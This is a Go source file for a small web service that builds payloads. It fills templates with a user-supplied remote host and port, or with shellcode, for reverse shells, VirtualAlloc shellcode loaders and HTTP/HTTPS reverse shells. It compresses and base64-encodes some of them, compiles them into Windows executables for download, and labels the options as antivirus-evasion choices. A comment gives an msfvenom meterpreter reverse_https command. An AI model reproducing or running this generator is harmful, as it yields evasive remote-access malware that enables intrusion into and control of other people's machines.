package main

import (
	"bufio"
	"bytes"
	"compress/flate"
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

type baseframe struct {
	Serverip string `json:"serverip"`
}

type DownloadLink struct {
	Link string
}

var appconfig baseframe
var dwnloadlink DownloadLink
var avtesttemplate *template.Template

func init() {
	appconfig = baseframe{}
	dwnloadlink = DownloadLink{}
	avtesttemplate = template.Must(template.ParseFiles("./templates/knocker.html"))
}
func main() {
	fmt.Println("knocker is ready ...")
	fmt.Println("http://0.0.0.0:8085")
	fillappconfig()
	http.HandleFunc("/", index)
	http.Handle("/download/", http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
	http.Handle("/outfiles/", http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))
	http.ListenAndServe(":8085", nil)
}

func fillappconfig() {
	apifile, err := ioutil.ReadFile("./config/appconfig.cfg")
	if err != nil {
		fmt.Println(err)
	}
	err = json.Unmarshal(apifile, &appconfig)
	if err != nil {
		fmt.Println(err)
	}

}
func buildexe(exepath string, gofilepath string) {
	cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
	err := cmd.Start()
	cmd.Wait()
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(exepath)
		fmt.Println(gofilepath)
		fmt.Println("Build Success !")
	}
}

func buildrevshellexeforpscript() {
	cmd := exec.Command("go", "build", "-o", "download/rev.exe", "outfiles/rev.go")
	err := cmd.Start()
	cmd.Wait()
	if err != nil {
		fmt.Println(err)

	}
	//finflag <- "exe generated"
}

func shellexeccompress(source string) []byte {
	w, _ := flate.NewWriter(nil, 7)
	buf := new(bytes.Buffer)
	w.Reset(buf)
	w.Write([]byte(source))
	w.Close()
	return buf.Bytes()
}

func readandreplacefilecontent(ipport string) string {
	baseframefile, err := os.Open("./basefiles/encode.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	/*newgoFile, err := os.Create("./outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()*/
	filestring := ""
	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "IP:PORT") {
			//fmt.Println(str)
			str = strings.Replace(str, "IP:PORT", ipport, 1)
		}
		filestring += str
		filestring += "\n"
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}
	return filestring
}

func createpsrevgofile() {
	baseframefile, err := os.Open("./basefiles/psrevcmd.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("./outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createpsvallocgofile() {
	baseframefile, err := os.Open("./basefiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("./outfiles/psvalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodepsvallocgofile() {
	baseframefile, err := os.Open("./basefiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	newgoFile, err := os.Create("./outfiles/psencodevalloc.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()

	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "SERVERIP") {
			str = strings.Replace(str, "SERVERIP", appconfig.Serverip, 1)
		}
		newgoFile.WriteString(str + "\n")
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}

}

func createencodedpsvirtualallocpayload(shellcode string) {
	file, err := os.Open("./basefiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("./outfiles/vallocencode.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createencodepsvallocgofile()
	buildexe("download/encpsalloc.exe", "outfiles/psencodevalloc.go")
}

func createpsvirtualallocpayload(rhost string, rport string, shellcode string) {
	file, err := os.Open("./basefiles/virtualalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("./outfiles/psvalloc.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "SHELLCODE") {
			str = strings.Replace(str, "SHELLCODE", shellcode, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsvallocgofile()
	buildexe("download/psalloc.exe", "outfiles/psvalloc.go")
}

// creategopayload("./basefiles/gorevhttp.go","./outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
func creategopayload(ipandport string, basefilepath string, outfilepath string, downloadlink string, sourcefilelink string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	buildexe(downloadlink, sourcefilelink)
}

func creategorevhttppayload(ipandport string) {
	file, err := os.Open("./basefiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("./outfiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
}
func createpsrevshellpayload(rhost string, rport string) {
	file, err := os.Open("./basefiles/rev.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("./outfiles/revpshell.ps1")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "IPADDRHERE") {
			str = strings.Replace(str, "IPADDRHERE", rhost, 1)
		} else if strings.Contains(str, "PORTHERE") {
			str = strings.Replace(str, "PORTHERE", rport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	createpsrevgofile()
	buildexe("download/rev.exe", "outfiles/rev.go")
	//buildrevshellexeforpscript()
	//finflag <- "finished pscriptexe"
}

func index(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := avtesttemplate.Execute(httpw, nil)
		if err != nil {
			fmt.Println(err)
		}
	} else {
		err := req.ParseForm()
		if err != nil {
			fmt.Println(err)
		}
		evadeoption := req.Form.Get("evadeoptions")
		fmt.Println(evadeoption)
		rhost := req.Form.Get("rhost")
		//fmt.Println("rhost = " + rhost)
		rport := req.Form.Get("rport")

		//fmt.Println("rport =" + rport)
		//finflag := make(chan string)
		if evadeoption == "psRevShell" {
			createpsrevshellpayload(rhost, rport)
			//<-finflag
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/rev.exe"
			os.Remove("./outfiles/rev.go")
			//fmt.Println(dwnloadlink.Link)
		} else if evadeoption == "psValloc" {
			shellcode := req.Form.Get("shellcode")
			createpsvirtualallocpayload(rhost, rport, shellcode)
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/psalloc.exe"
			os.Remove("./outfiles/psvalloc.go")
			//fmt.Println("shellcode =" + shellcode)

		} else if evadeoption == "psVallocencode" {

			strtocompress := readandreplacefilecontent(rhost + ":" + rport)
			//fmt.Println(strtocompress)
			compressed := shellexeccompress(strtocompress)
			//fmt.Println(compressed)
			encstring := b64.StdEncoding.EncodeToString(compressed)
			createencodedpsvirtualallocpayload(encstring)
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/encpsalloc.exe"
			os.Remove("./outfiles/psencodevalloc.go")
			//fmt.Println(dwnloadlink.Link)

		} else if evadeoption == "gorevhttpvalloc" {
			//creategorevhttppayload(rhost + ":" + rport)
			creategopayload(rhost+":"+rport, "./basefiles/gorevhttp.go", "./outfiles/gorevhttp.go", "download/gorevhttp.exe", "outfiles/gorevhttp.go")
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/gorevhttp.exe"
			os.Remove("./outfiles/gorevhttp.go")
		} else if evadeoption == "goRevShel" {
			creategopayload(rhost+":"+rport, "./basefiles/gorevcmd.go", "./outfiles/gorevcmd.go", "download/gorevcmd.exe", "outfiles/gorevcmd.go")
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/gorevcmd.exe"
			os.Remove("./outfiles/gorevcmd.go")
		} else if evadeoption == "gorevhttpsheap" {
			creategopayload(rhost+":"+rport, "./basefiles/gorevhttps.go", "./outfiles/gorevhttps.go", "download/gorevhttps.exe", "outfiles/gorevhttps.go")
			time.Sleep(5000 * time.Millisecond)
			dwnloadlink.Link = "download/gorevhttps.exe"
			os.Remove("./outfiles/gorevhttps.go")
		}
		//msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=443 -f psh

		err = avtesttemplate.Execute(httpw, dwnloadlink)
		if err != nil {
			fmt.Println(err)
		}

	}
}
